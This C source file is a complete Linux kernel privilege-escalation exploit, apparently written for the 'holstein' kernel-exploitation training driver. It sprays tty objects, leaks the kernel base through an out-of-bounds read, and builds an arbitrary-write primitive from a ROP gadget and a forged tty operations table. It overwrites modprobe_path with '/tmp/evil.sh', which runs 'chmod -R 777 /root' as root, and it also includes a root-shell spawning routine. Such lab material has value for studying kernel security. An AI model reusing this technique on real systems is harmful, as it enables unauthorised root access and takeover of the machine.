#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <liburing.h>
#include <pthread.h>

#include <sys/capability.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/ioctl.h>

#include <linux/capability.h>
#include <linux/types.h>

#define DEBUG

#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)

#define WAIT()                \
    do                        \
    {                         \
        puts("[WAITING...]"); \
        getchar();            \
    } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

uint64_t user_rip;
uint64_t user_cs;
uint64_t user_rflags;
uint64_t user_rsp;
uint64_t user_ss;

void get_shell()
{
    if (getuid())
    {
        errExit("NO ROOT");
    }

    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};

    logOK("Got shell!");
    execve(argv[0], argv, envp);
}

void hex_dump(char *buf, size_t size)
{
    for (size_t i = 0; i <= size / 8; i++)
    {
        printf("[+] buf[0x%04lx] -> 0x%016lx\n",
               i * 8,
               ((uint64_t *)buf)[i]); // = *((uint64_t *)(buf + i * 8)); || *(uint64_t *)&buf[i * 8]
    }
}

void save_state()
{
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop qword ptr [rip+user_rflags];");
    user_rip = (uint64_t)(uintptr_t)get_shell;
    logInfo("Saved user state - RIP: 0x%lx, CS: 0x%lx, RFLAGS: 0x%lx, RSP: 0x%lx, SS: 0x%lx",
            user_rip, user_cs, user_rflags, user_rsp, user_ss);
}

#define ofs_tty_ops 0xc38880
#define addr_modprobe_path (kbase + 0xe38180)
#define rop_mov_prdx_rcx (kbase + 0x0477f7)
#define SPRAY_NUM 100

uint64_t kbase;
uint64_t g_buf;

int _spray[SPRAY_NUM];
int fd;
// uint64_t buf[0x600] = {0};
uint64_t *buf;

void spray()
{
    for (int i = 0; i < SPRAY_NUM / 2; i++)
    {
        _spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (_spray[i] == -1)
            errExit("open ptmx");
    }

    fd = open("/dev/holstein", O_RDWR);
    if (fd == -1)
        errExit("open holstein");

    for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++)
    {
        _spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (_spray[i] == -1)
            errExit("open ptmx");
    }
}

void leak()
{
    buf = calloc(0x600, sizeof(uint64_t));
    read(fd, buf, 0x500);
    // hex_dump(buf, 0x500);

    kbase = buf[0x418 / 8] - ofs_tty_ops;
    g_buf = buf[0x438 / 8] - 0x438;

    logInfo("kbase = 0x%lx", kbase);
    logInfo("g_buf = 0x%lx", g_buf);
}

void AAW32(uint64_t where, uint32_t what)
{
    buf[12] = rop_mov_prdx_rcx;
    buf[0x418 / 8] = g_buf;
    write(fd, buf, 0x420);

    for (int i = 0; i < 100; i++)
    {
        ioctl(_spray[i], what /* rcx */, where /* rdx */);
    }
}

int main()
{
    save_state();
    spray();
    leak();

    char *cmd = "/tmp/evil.sh";
    for (int i = 0; i < sizeof(cmd); i += 4)
    {
        AAW32(addr_modprobe_path + i, *(uint32_t *)&cmd[i]);
    }

    system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
    system("chmod +x /tmp/evil.sh");
    system("echo -e '\xde\xad\xbe\xef' > /tmp/exploit");
    system("chmod +x /tmp/exploit");
    system("/tmp/exploit");

    return 0;
}
